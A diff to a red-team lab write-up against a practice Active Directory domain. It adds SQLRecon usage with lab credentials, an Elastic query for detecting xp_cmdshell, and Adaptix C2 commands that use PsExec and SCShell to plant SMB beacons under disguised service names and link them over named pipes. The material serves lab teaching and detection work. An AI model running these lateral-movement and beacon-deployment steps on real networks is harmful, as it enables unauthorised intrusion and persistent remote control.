@@ -976,7 +976,7 @@ proxychains mssqlclient.py north.sevenkingdoms.local/samwell.tarly:Heartsbane@10
 
 **C2 (SQLRecon via execute-assembly):**
 
-SQLRecon runs inline through `execute-assembly`. It loads the .NET CLR into the beacon process and connects with Windows domain authentication. No binary is written to disk.
+SQLRecon was used because it supports Windows Authentication, which the SQL-BOF collection does not provide support. SQLRecon runs inline through `execute-assembly`. It loads the .NET CLR into the beacon process and connects with Windows domain authentication. No binary is written to disk.
 
 ```
 execute-assembly SQLRecon.exe /auth:WinDomain /host:10.1.10.22 /domain:north.sevenkingdoms.local /username:samwell.tarly /password:Heartsbane /module:info
@@ -1100,7 +1100,7 @@ The command runs as `north\sql_svc`. This is the SQL Server service account. Fro
 
 **Elastic Query - Detect xp_cmdshell Execution:**
 
-No prebuilt rule fires. Detect `xp_cmdshell` by looking for child processes of `sqlservr.exe`. This catches any OS command run through SQL Server, regardless of the tool used to trigger it.
+Detect `xp_cmdshell` by looking for child processes of `sqlservr.exe`. This catches any OS command run through SQL Server, regardless of the tool used to trigger it.
 
 ```
 process.parent.name:"sqlservr.exe" AND NOT process.name:("sqlwriter.exe" OR "sqlceip.exe" OR "sqlagent.exe")
@@ -1222,6 +1222,26 @@ jump psexec -b svcutil.exe -n "WinConfigSvc" -d "Manages system configuration up
 
 ![](image/red-team-workflow/20260922165516.png)
 
+**C2 Command (default Adaptix beacon with SMB pivot):**
+
+The default Adaptix agent supports SMB listeners natively. This enables realistic lateral movement: PsExec drops the SMB beacon on the target, and the parent beacon links to it over a named pipe. All C2 traffic tunnels through the parent HTTP beacon. No new outbound connections from the target.
+
+```
+jump psexec -b svcutil2.exe -n "WinConfigSvc134" -d "Manages system configuration updates" 10.1.10.11 /home/stillbigjosh/Downloads/svc_smb_x64.exe
+```
+
+![PsExec with default Adaptix SMB beacon](writeups/images/red-team-workflow/20260923172435.png)
+
+After the service executes, link to the SMB beacon on the target:
+
+```
+link smb 10.1.10.11 TSVCPIPE-4036c92b-65ae-4601-1337-57f7b24a0c57
+```
+
+![SMB link established](writeups/images/red-team-workflow/20260923172443.png)
+
+![SMB beacon active on winterfell](writeups/images/red-team-workflow/20260923172421.png)
+
 Full syntax:
 
 ```
@@ -1305,6 +1325,22 @@ jump scshell 10.1.10.11 /local/path/to/smb_x64_svc.exe -n defragsvc -b update.ex
 ![](image/red-team-workflow/20260922165815.png)
 
 ![](image/red-team-workflow/20260922165720.png)
+
+**C2 Command (default Adaptix beacon with SMB pivot):**
+
+```
+jump scshell 10.1.10.11 /home/stillbigjosh/Downloads/svc_smb_x64.exe -n defragsvc -b msupdate.exe -s C$ -p C:\Windows
+```
+
+![SCShell with default Adaptix SMB beacon](writeups/images/red-team-workflow/20260923172750.png)
+
+![SCShell service modification](writeups/images/red-team-workflow/20260923172738.png)
+
+```
+link smb 10.1.10.11 TSVCPIPE-4036c92b-65ae-4601-1337-57f7b24a0c57
+```
+
+![SMB beacon linked after SCShell](writeups/images/red-team-workflow/20260923172713.png)
 
 Full syntax:
 
